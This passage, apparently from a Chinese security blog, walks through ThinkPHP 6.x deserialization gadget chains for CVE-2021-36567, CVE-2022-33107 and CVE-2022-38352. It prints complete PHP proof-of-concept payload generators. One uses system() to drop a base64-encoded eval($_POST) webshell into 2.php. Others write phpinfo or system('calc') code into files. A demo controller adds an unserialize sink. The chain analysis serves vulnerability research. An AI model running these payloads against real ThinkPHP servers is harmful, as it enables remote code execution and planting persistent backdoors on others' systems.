<p>此外我们看下Y4tacker师傅的poc<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">League</span>\<span class="title class_">Flysystem</span>\<span class="title class_">Cached</span>\<span class="title class_">Storage</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">League</span>\<span class="title class_">Flysystem</span>\<span class="title class_">Filesystem</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractCache</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$autosave</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Adapter</span> <span class="keyword">extends</span> <span class="title">AbstractCache</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$adapter</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$file</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;complete = <span class="string">&quot;*/&lt;?php phpinfo();?&gt;&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;expire = <span class="string">&quot;yydsy4&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;adapter = <span class="keyword">new</span> <span class="title class_">\League\Flysystem\Adapter\Local</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file = <span class="string">&quot;y4tacker.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">League</span>\<span class="title class_">Flysystem</span>\<span class="title class_">Adapter</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Local</span> <span class="title class_">extends</span> <span class="title class_">AbstractAdapter</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">AbstractAdapter</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">pathPrefix</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;pathPrefix = <span class="string">&quot;./&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">League</span>\<span class="title class_">Flysystem</span>\<span class="title class_">Cached</span>\<span class="title class_">Storage</span>\<span class="title class_">Adapter</span>;</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Adapter</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>((<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>区别就是初始化的时候赋值的complete变量,因为<code>$contents = $this-&gt;getForStorage();</code><br>我们跟进getForStorage()方法就可以发现<code>return json_encode([$cleaned, $this-&gt;complete, $this-&gt;expire]);</code><br>我们自然可以只赋值complete变量</p>
<h2 id="CVE-2021-36567"><a href="#CVE-2021-36567" class="headerlink" title="CVE-2021-36567"></a>CVE-2021-36567</h2><h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>ThinkPHP v6.0.8 已通过组件 League\Flysystem\Cached\Storage\AbstractCache 包含反序列化漏洞。</p>
<h3 id="范围-2"><a href="#范围-2" class="headerlink" title="范围"></a>范围</h3><p>thinkphp&lt;=6.0.8,Linux系统,因为核心是把system(json加密的数据),类似:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[[&quot;`whoami`&quot;],[]]</span><br></pre></td></tr></table></figure><br>这样的结果返回,Windows肯定不会执行成功,Linux可以返回,虽然没有回显但是命令执行函数已经执行了.所以我们可以写木马文件<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[[jmx],[]]: command not found</span><br></pre></td></tr></table></figure></p>
<h3 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">League</span>\<span class="title class_">Flysystem</span>\<span class="title class_">Cached</span>\<span class="title class_">Storage</span>&#123;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">AbstractCache</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">autosave</span> = <span class="title class_">false</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$complete</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$cache</span> = [<span class="string">&#x27;`echo PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+|base64 -d &gt; 2.php`&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">filesystem</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">League</span>\<span class="title class_">Flysystem</span>\<span class="title class_">Cached</span>\<span class="title class_">Storage</span>\<span class="title class_">AbstractCache</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">CacheStore</span> <span class="keyword">extends</span> <span class="title">AbstractCache</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$store</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$key</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$store</span>,<span class="variable">$key</span>,<span class="variable">$expire</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;key    = <span class="variable">$key</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;store  = <span class="variable">$store</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;expire = <span class="variable">$expire</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">cache</span>&#123;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">Driver</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">namespace</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">driver</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">Driver</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">File</span> <span class="keyword">extends</span> <span class="title">Driver</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$options</span> = [</span><br><span class="line">            <span class="string">&#x27;expire&#x27;</span>        =&gt; <span class="number">0</span>,</span><br><span class="line">            <span class="string">&#x27;cache_subdir&#x27;</span>  =&gt; <span class="literal">false</span>,</span><br><span class="line">            <span class="string">&#x27;prefix&#x27;</span>        =&gt; <span class="literal">false</span>,</span><br><span class="line">            <span class="string">&#x27;path&#x27;</span>          =&gt; <span class="string">&#x27;y4tacker&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;hash_type&#x27;</span>     =&gt; <span class="string">&#x27;md5&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;serialize&#x27;</span>     =&gt; [<span class="string">&#x27;system&#x27;</span>],</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $<span class="title class_">b</span> = <span class="title class_">new</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">driver</span>\<span class="title class_">File</span>();</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> think\filesystem\<span class="title function_ invoke__">CacheStore</span>(<span class="variable">$b</span>,<span class="string">&#x27;y4tacker&#x27;</span>,<span class="string">&#x27;1111&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>这个链子也非常简单<br><code>League\Flysystem\Cached\Storage\AbstractCache</code>的__destruct<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">if</span> (! <span class="variable language_">$this</span>-&gt;autosave) &#123;  </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">save</span>();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><code>think\filesystem</code>的CacheStore.php的save()方法:<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240219201203.png" alt="image.png"><br>getForStorage()方法<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240219201254.png" alt="image.png"><br>调试多了都有经验了,这里设置的cache是一维数组会直接返回cache的值:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[&#x27;`echo PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+|base64 -d &gt; 2.php`&#x27;]</span><br></pre></td></tr></table></figure><br>最后返回json_encode函数处理后的结果<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[[&quot;`echo PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+|base64 -d &gt; 2.php`&quot;],[]]</span><br></pre></td></tr></table></figure></p>
<p>然后进入<code>$this-&gt;store-&gt;set</code>,也就是<code>think\cache\driver\File</code>的set()方法:<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240219201528.png" alt="image.png"><br>创建文件目录和文件名后进入serialize方法<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240219201621.png" alt="image.png"><br>这里提前设置了<code>$this-&gt;options[&#39;serialize&#39;]</code>为system<br>执行<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system(&#x27;[[&quot;`echo PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+|base64 -d &gt; 2.php`&quot;],[]]&#x27;)</span><br></pre></td></tr></table></figure><br>最后虽然没有返回但是命令也被执行了,成功创建文件<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240219201843.png" alt="image.png"></p>
<p>我们自然可以只赋值complete变量,把cache变量设置为空数组也可以</p>
<h2 id="CVE-2022-33107"><a href="#CVE-2022-33107" class="headerlink" title="CVE-2022-33107"></a>CVE-2022-33107</h2><h3 id="适用范围"><a href="#适用范围" class="headerlink" title="适用范围"></a>适用范围</h3><p>thinkphp&lt;=6.0.12</p>
<p>Poc:<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">concern</span>&#123;</span><br><span class="line">    <span class="title class_">trait</span> <span class="title class_">Attribute</span>&#123;</span><br><span class="line">        <span class="title class_">private</span> $<span class="title class_">data</span> = [&#x27;<span class="title class_">huahua</span>&#x27;];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">view</span>\<span class="title class_">driver</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Php</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">namespace</span> <span class="title class_">think</span>\<span class="title class_">session</span>\<span class="title class_">driver</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">File</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">namespace</span> <span class="title class_">League</span>\<span class="title class_">Flysystem</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">File</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">path</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$filesystem</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$File</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;path=<span class="string">&#x27;huahua.php&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;filesystem=<span class="variable">$File</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">console</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">League</span>\<span class="title class_">Flysystem</span>\<span class="title class_">File</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Output</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$styles</span>=[];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$handle</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$File</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;styles[]=<span class="string">&#x27;getDomainBind&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;handle=<span class="keyword">new</span> <span class="title class_">File</span>(<span class="variable">$File</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>&#123;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">Model</span>&#123;</span><br><span class="line">        <span class="title class_">use</span> <span class="title class_">model</span>\<span class="title class_">concern</span>\<span class="title class_">Attribute</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$lazySave</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$withEvent</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$table</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$cmd</span>,<span class="variable">$File</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;lazySave = <span class="literal">true</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;withEvent = <span class="literal">false</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;table = <span class="keyword">new</span> route\<span class="title function_ invoke__">Url</span>(<span class="keyword">new</span> <span class="title class_">Middleware</span>,<span class="keyword">new</span> console\<span class="title function_ invoke__">Output</span>(<span class="variable">$File</span>),<span class="variable">$cmd</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Middleware</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$request</span> = <span class="number">2333</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">route</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Url</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">url</span> = &#x27;<span class="title class_">a</span>:&#x27;;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$domain</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$app</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$route</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$app</span>,<span class="variable">$route</span>,<span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;domain = <span class="variable">$cmd</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;app = <span class="variable">$app</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;route = <span class="variable">$route</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $<span class="title class_">zoe</span>=&#x27;&lt;?= <span class="title class_">phpinfo</span>(); <span class="keyword">exit</span>();<span class="comment">//&#x27;;</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> think\Model\<span class="title function_ invoke__">Pivot</span>(<span class="variable">$zoe</span>,<span class="keyword">new</span> think\session\driver\File)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>入口点在<code>think\Model\</code>的<strong>destruct()方法<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240219215011.png" alt="image.png"><br>进入save()方法<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240219215029.png" alt="image.png"><br>进入insertData()方法<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240219215127.png" alt="image.png"><br>进入checkAllowFields()方法<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240219215223.png" alt="image.png"><br>进入db()方法<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240219215245.png" alt="image.png"><br>执行<code>$query-&gt;table($this-&gt;table . $this-&gt;suffix);</code>语句<br>此时开始进入链子了,拼接对象和字符串造成toString魔术方法调用,<code>think\route</code>的Url.php<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240219215401.png" alt="image.png"><br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240219215444.png" alt="image.png"><br>if语句一直进不去,最后跑到<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$bind = $this-&gt;route-&gt;getDomainBind($domain &amp;&amp; is_string($domain) ? $domain : null);</span><br></pre></td></tr></table></figure><br>然后进入getDomainBind()方法,这里设置了domain的值,直接进入了Output.php的</strong>call()方法: <code>call_user_func_array([$this, &#39;block&#39;], $args);</code></p>
<p>Output.php的block()方法-&gt;writeln()方法<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">writeln</span>(<span class="string">&quot;&lt;<span class="subst">&#123;$style&#125;</span>&gt;<span class="subst">&#123;$message&#125;</span>&lt;/<span class="subst">$style</span>&gt;&quot;</span>);</span><br></pre></td></tr></table></figure><br>Output.php的writeln()方法-&gt;write()方法:<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$messages</span>, <span class="literal">true</span>, <span class="variable">$type</span>);</span><br></pre></td></tr></table></figure><br>此时message为<code>&lt;getDomainBind&gt;&lt;?=+phpinfo();+exit();//&lt;/getDomainBind&gt;</code><br>write()方法<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$this-&gt;handle-&gt;write($messages, $newline, $type);</span><br></pre></td></tr></table></figure><br><code>$this-&gt;handle</code>被设置的<code>League\Flysystem\File</code>,调用它的write()方法<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$content</span></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;filesystem-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;path, <span class="variable">$content</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><code>$this-&gt;filesystem</code>被设置的<code>think\session\driver\File</code>,调用它的write()方法:<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240216223835.png" alt="image.png"><br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240216223848.png" alt="image.png"><br>最后执行file_put_contents写入木马文件</p>
<h2 id="CVE-2022-38352"><a href="#CVE-2022-38352" class="headerlink" title="CVE-2022-38352"></a>CVE-2022-38352</h2><h3 id="影响版本-Thinkphp-lt-v6-0-13"><a href="#影响版本-Thinkphp-lt-v6-0-13" class="headerlink" title="影响版本: Thinkphp &lt;= v6.0.13"></a>影响版本: Thinkphp &lt;= v6.0.13</h3><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍:"></a>介绍:</h3><p>攻击者可以通过组件<code>League\Flysystem\Cached\Storage\Psr6Cache</code>包含反序列化漏洞,目前的Thinkphp6.1.0以上已经将filesystem移除了 因为此处存在好多条反序列化漏洞</p>
<p>安装和前一篇文章一样,这里为了方便就用上一篇文章的6.0.12了</p>
<h3 id="poc"><a href="#poc" class="headerlink" title="poc:"></a>poc:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">League</span>\<span class="title class_">Flysystem</span>\<span class="title class_">Cached</span>\<span class="title class_">Storage</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Psr6Cache</span>&#123;</span><br><span class="line">        <span class="title class_">private</span> $<span class="title class_">pool</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$autosave</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$exp</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;pool = <span class="variable">$exp</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">log</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Channel</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">logger</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$lazy</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$exp</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;logger = <span class="variable">$exp</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;lazy = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Request</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">url</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;url = <span class="string">&#x27;&lt;?php system(\&#x27;calc\&#x27;); exit(); ?&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">App</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$instances</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;instances = [<span class="string">&#x27;think\Request&#x27;</span>=&gt;<span class="keyword">new</span> <span class="title class_">Request</span>()];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">view</span>\<span class="title class_">driver</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Php</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">namespace</span> <span class="title class_">think</span>\<span class="title class_">log</span>\<span class="title class_">driver</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Socket</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">config</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$app</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;config = [</span><br><span class="line">                <span class="string">&#x27;debug&#x27;</span>=&gt;<span class="literal">true</span>,</span><br><span class="line">                <span class="string">&#x27;force_client_ids&#x27;</span> =&gt; <span class="number">1</span>,</span><br><span class="line">                <span class="string">&#x27;allow_client_ids&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;format_head&#x27;</span> =&gt; [<span class="keyword">new</span> \think\view\driver\Php,<span class="string">&#x27;display&#x27;</span>],</span><br><span class="line">            ];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;app = <span class="keyword">new</span> \think\<span class="title function_ invoke__">App</span>();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $<span class="title class_">c</span> = <span class="title class_">new</span> <span class="title class_">think</span>\<span class="title class_">log</span>\<span class="title class_">driver</span>\<span class="title class_">Socket</span>();</span><br><span class="line">    <span class="variable">$b</span> = <span class="keyword">new</span> think\log\<span class="title function_ invoke__">Channel</span>(<span class="variable">$c</span>);</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">League\Flysystem\Cached\Storage\Psr6Cache</span>(<span class="variable">$b</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p>在Index.php添加反序列化点:<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">BaseController</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">BaseController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&quot;a&quot;</span>])&#123;</span><br><span class="line">            <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="string">&quot;a&quot;</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params"><span class="variable">$name</span> = <span class="string">&#x27;ThinkPHP6&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;hello,&#x27;</span> . <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
